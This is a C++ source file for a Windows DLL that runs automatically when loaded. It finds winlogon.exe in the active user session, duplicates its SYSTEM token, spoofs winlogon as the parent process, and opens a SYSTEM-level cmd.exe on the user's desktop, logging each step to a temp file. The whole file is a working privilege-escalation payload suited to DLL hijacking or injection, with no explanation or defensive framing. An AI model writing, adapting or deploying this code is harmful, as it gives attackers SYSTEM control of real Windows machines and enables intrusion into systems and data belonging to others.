#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <Winbase.h>
#include <Wtsapi32.h>
#include <Userenv.h>
#include <malloc.h>
#include <Tlhelp32.h>

#include <iostream>
#include <fstream>

#pragma comment(lib, "Wtsapi32.lib")
#pragma comment(lib, "Userenv.lib")
#pragma comment(lib, "Advapi32.lib")

#define DLL_EXPORT __declspec(dllexport)

void Log(const char* msg, DWORD err = 0) {
	std::ofstream f("C:\\Windows\\Temp\\spawn_debug.log", std::ios::app);
	if (f.is_open()) {
		f << msg;
		if (err != 0) {
			f << " (error: " << err << ")";
		}
		f << std::endl;
		f.close();
	}
}

DWORD GetActiveSessionId() {
	PWTS_SESSION_INFO pSessionInfo = NULL;
	DWORD sessionCount = 0;
	DWORD sessionId = 0xFFFFFFFF;

	if (WTSEnumerateSessionsW(NULL, 0, 1, &pSessionInfo, &sessionCount)) {
		for (DWORD i = 0; i < sessionCount; i++) {
			if (pSessionInfo[i].State == WTSActive) {
				sessionId = pSessionInfo[i].SessionId;
				break;
			}
		}
		WTSFreeMemory(pSessionInfo);
	}

	char buf[64];
	sprintf_s(buf, "Active session ID: %d", sessionId);
	Log(buf);
	return sessionId;
}

DWORD FindWinlogonPid(DWORD targetSessionId) {
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

	PROCESSENTRY32W pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32W);
	DWORD pid = 0;

	if (Process32FirstW(hSnapshot, &pe32)) {
		do {
			if (_wcsicmp(pe32.szExeFile, L"winlogon.exe") == 0) {
				DWORD procSessionId = 0;
				if (ProcessIdToSessionId(pe32.th32ProcessID, &procSessionId) && procSessionId == targetSessionId) {
					pid = pe32.th32ProcessID;
					break;
				}
			}
		} while (Process32NextW(hSnapshot, &pe32));
	}

	CloseHandle(hSnapshot);

	char buf[128];
	sprintf_s(buf, "winlogon PID: %d (session %d)", pid, targetSessionId);
	Log(buf);
	return pid;
}

bool SpawnCmd() {
	BOOL bSuccess = FALSE;

	HANDLE hWinlogon = NULL;
	HANDLE hWinlogonToken = NULL;
	HANDLE newToken = NULL;
	LPVOID pEnv = NULL;
	LPPROC_THREAD_ATTRIBUTE_LIST pAttrList = NULL;

	DWORD dwCreationFlags = NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE | EXTENDED_STARTUPINFO_PRESENT;

	STARTUPINFOEXW siex;
	ZeroMemory(&siex, sizeof(siex));
	siex.StartupInfo.cb = sizeof(siex);
	siex.StartupInfo.lpDesktop = LPWSTR(L"Winsta0\\default");

	PROCESS_INFORMATION pi;
	ZeroMemory(&pi, sizeof(pi));

	DWORD sessionId = GetActiveSessionId();
	if (sessionId == 0xFFFFFFFF) {
		Log("No active session found");
		goto CLEANUP_EXIT;
	}

	// Find winlogon in user's session
	{
		DWORD winlogonPid = FindWinlogonPid(sessionId);
		if (winlogonPid == 0) {
			Log("winlogon not found");
			goto CLEANUP_EXIT;
		}

		hWinlogon = OpenProcess(PROCESS_CREATE_PROCESS | PROCESS_QUERY_INFORMATION, FALSE, winlogonPid);
		if (hWinlogon == NULL) {
			Log("OpenProcess winlogon failed", GetLastError());
			goto CLEANUP_EXIT;
		}

		if (!OpenProcessToken(hWinlogon, TOKEN_DUPLICATE | TOKEN_QUERY, &hWinlogonToken)) {
			Log("OpenProcessToken winlogon failed", GetLastError());
			goto CLEANUP_EXIT;
		}

		if (!DuplicateTokenEx(hWinlogonToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &newToken)) {
			Log("DuplicateTokenEx failed", GetLastError());
			goto CLEANUP_EXIT;
		}
		Log("Duplicated winlogon SYSTEM token");
	}

	// Set winlogon as parent process
	{
		SIZE_T attrSize = 0;
		InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
		pAttrList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attrSize);
		if (pAttrList == NULL) {
			Log("HeapAlloc failed");
			goto CLEANUP_EXIT;
		}

		if (!InitializeProcThreadAttributeList(pAttrList, 1, 0, &attrSize)) {
			Log("InitializeProcThreadAttributeList failed", GetLastError());
			goto CLEANUP_EXIT;
		}

		if (!UpdateProcThreadAttribute(pAttrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
			&hWinlogon, sizeof(HANDLE), NULL, NULL)) {
			Log("UpdateProcThreadAttribute failed", GetLastError());
			goto CLEANUP_EXIT;
		}

		siex.lpAttributeList = pAttrList;
		Log("Set parent process to winlogon");
	}

	if (CreateEnvironmentBlock(&pEnv, newToken, TRUE)) {
		dwCreationFlags |= CREATE_UNICODE_ENVIRONMENT;
	}
	else {
		Log("CreateEnvironmentBlock failed", GetLastError());
	}

	if (!CreateProcessAsUserW(newToken, L"C:\\Windows\\System32\\cmd.exe",
		NULL, NULL, NULL, FALSE, dwCreationFlags, pEnv, L"C:\\Windows\\System32\\",
		(LPSTARTUPINFOW)&siex, &pi)) {
		Log("CreateProcessAsUserW failed", GetLastError());
		goto CLEANUP_EXIT;
	}

	{
		DWORD procSessionId = 0;
		ProcessIdToSessionId(pi.dwProcessId, &procSessionId);
		char buf[128];
		sprintf_s(buf, "SUCCESS: cmd.exe PID %d in session %d", pi.dwProcessId, procSessionId);
		Log(buf);
	}

	bSuccess = TRUE;

CLEANUP_EXIT:
	if (!bSuccess) Log("SpawnCmd FAILED");

	if (pAttrList != NULL) {
		DeleteProcThreadAttributeList(pAttrList);
		HeapFree(GetProcessHeap(), 0, pAttrList);
	}
	if (newToken != NULL) CloseHandle(newToken);
	if (hWinlogonToken != NULL) CloseHandle(hWinlogonToken);
	if (hWinlogon != NULL) CloseHandle(hWinlogon);
	if (pi.hProcess != NULL) CloseHandle(pi.hProcess);
	if (pi.hThread != NULL) CloseHandle(pi.hThread);
	if (pEnv != NULL) DestroyEnvironmentBlock(pEnv);
	return bSuccess;
}

int Execute()
{
	Log("=== Execute called ===");

	HANDLE hMutex = CreateMutexW(NULL, FALSE, L"CmdMutex");
	if (hMutex == NULL) return 1;

	if (GetLastError() == ERROR_ALREADY_EXISTS) {
		CloseHandle(hMutex);
		return 0;
	}

	SpawnCmd();

	CloseHandle(hMutex);
	return 0;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
		Execute();
		break;
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}